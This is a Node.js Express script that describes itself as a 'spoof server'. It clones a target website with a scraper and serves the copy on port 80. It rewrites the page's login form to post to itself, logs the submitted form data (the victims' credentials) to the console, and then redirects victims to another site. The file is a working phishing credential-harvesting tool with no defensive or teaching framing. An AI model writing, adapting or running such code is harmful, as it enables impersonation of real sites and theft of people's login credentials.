var request = require('request');
var http = require('http');
var cheerio = require('cheerio');
var express = require('express');
var bodyParser = require('body-parser');
var app = express();
var scrape = require('website-scraper');
var fs = require('fs');
qs = require('querystring');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json({ type: 'application/*+json' }));
app.use(express.static('public'));

if (process.argv.length < 3){
  console.log("No site specified");
  process.exit(1);
}
if (process.argv.length < 4){
  console.log("No redirect website specified");
  process.exit(1);
}

var site = process.argv[2];
var resite = process.argv[3];


if (site == resite){
  console.log("You can't redirect to the same site");
  process.exit(1);
}

console.log("Runnings spoof server of " + site);
console.log("Redirecting to " + resite);

var options = {
  urls: [site],
  directory: './public',
  defaultFilename: 'home.html',
};

app.get('*', function (req, res) {
  // LOAD THE FILE FROM PUBLIC INDEX.HTML
  // cheerio.load(fs.readFileSync('path/to/file.html'));
  request(options.urls[0], function (error, response, html) {
    if (!error && response.statusCode == 200) {
      x = html;
    }
    scrape(options).then((result) => {
      var $ = cheerio.load(fs.readFileSync('public/home.html'));
      $('form.loginform').attr('action', "*");
      res.send($.html());
    }).catch((err) => {
      var $ = cheerio.load(fs.readFileSync('public/home.html'));
      $('form.loginform').attr('action', "*");
      res.send($.html());
    });
  });
});

app.listen(80, function () {
  console.log('Example app listening on port 80!');
});

app.post('*', function(req, res){
  console.log(req.body);
  res.redirect(resite);
});


